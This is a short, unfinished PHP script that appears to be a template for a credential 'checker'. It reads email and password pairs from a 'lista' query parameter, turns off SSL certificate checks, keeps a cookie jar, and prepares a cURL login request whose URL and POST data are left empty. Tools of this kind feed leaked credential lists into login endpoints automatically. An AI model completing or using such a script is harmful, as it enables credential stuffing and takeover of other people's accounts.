<?php
error_reporting(0);
usleep(5);
if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
("cookie.txt", 'w+');fclose
("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

  function getStr($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
 }

 function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
 }

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

));
curl_setopt($ch, CURLOPT_POSTFIELDS,'');
$r1 = curl_exec($ch);

